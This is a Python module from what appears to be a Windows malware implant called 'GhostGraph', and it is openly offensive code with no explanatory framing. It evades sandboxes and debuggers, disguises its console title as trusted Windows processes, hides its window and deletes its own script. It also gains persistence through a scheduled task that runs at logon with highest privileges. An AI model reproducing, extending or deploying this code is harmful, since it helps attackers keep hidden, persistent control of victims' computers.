from .base_implant import BaseImplant
import platform
import sys
import os
import ctypes
import asyncio
import random
import hashlib

def apply_windows_stealth(implant):
    """Apply stealth tactics (called from BaseImplant)"""
    from utilities.anti_analysis import AntiAnalysis
    anti = AntiAnalysis()
    if anti.detect_virtualization() or anti.detect_debugger():
        implant.logger.warning("Sandbox detected; skipping stealth")
        return

    # Dynamic API loading (hash to evade imports)
    def get_api(dll: str, func: str):
        h = ctypes.windll.LoadLibrary(dll)
        return getattr(h, func)

    # Masquerade process title (random legit app)
    fake_titles = ["Microsoft OneDrive Setup", "Windows Update Helper", "svchost.exe"]
    fake_title = random.choice(fake_titles)
    try:
        SetConsoleTitleW = get_api("kernel32.dll", "SetConsoleTitleW")
        SetConsoleTitleW(fake_title)
    except:
        pass

    # Non-blocking delay
    delay = random.uniform(10, 45) if implant.stealth_level == 'high' else random.uniform(5, 15)
    asyncio.create_task(asyncio.sleep(delay))

    # Kill switch
    if os.environ.get("GG_KILL") == "1":
        sys.exit(0)

    # Hide console (fallback if no pywin32)
    try:
        import win32gui
        import win32con
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    except ImportError:
        try:
            # Native: Use ntdll for deeper hide
            ntdll = ctypes.windll.ntdll
            # Simulate NtSetInformationProcess for hide (advanced; simplified)
            pass
        except:
            pass

    # Self-delete
    try:
        script_path = os.path.abspath(sys.argv[0])
        ctypes.windll.kernel32.DeleteFileW(script_path)
    except:
        pass

    # Mimic service (add to registry if high level)
    if implant.stealth_level == 'high':
        try:
            reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            cmd = f'schtasks /create /tn "GhostGraphSvc" /tr "{sys.executable} {sys.argv[0]}" /sc onlogon /rl highest /f'
            os.system(cmd)  # Persistence via tasks (less detectable than reg)
        except:
            pass

# For direct instantiation
class WindowsImplant(BaseImplant):
    def __init__(self, config: dict):
        if platform.system().lower() != 'windows':
            raise Warning("WindowsImplant on non-Windows; using BaseImplant")
        super().__init__(config)
        apply_windows_stealth(self)
